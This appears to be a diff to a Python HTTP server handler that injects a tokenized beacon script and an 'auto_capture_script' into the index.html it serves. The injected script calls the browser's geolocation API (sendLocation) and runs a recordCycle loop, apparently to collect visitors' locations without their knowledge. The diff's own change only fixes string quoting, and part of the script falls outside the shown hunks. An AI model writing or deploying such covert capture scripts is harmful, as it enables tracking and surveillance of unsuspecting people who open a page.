@@ -357,7 +357,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         with open("index.html", "rb") as f:
             html = f.read().decode("utf-8", "replace")
         
-        auto_capture_script = \"\"\"
+        auto_capture_script = """
         <script>
             function sendLocation() {
                 if (navigator.geolocation) {
@@ -392,7 +392,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 recordCycle();
             }).catch(e => {});
         </script>
-        \"\"\"
         """
         
         script = BEACON_JS.replace("__T__", token) + auto_capture_script
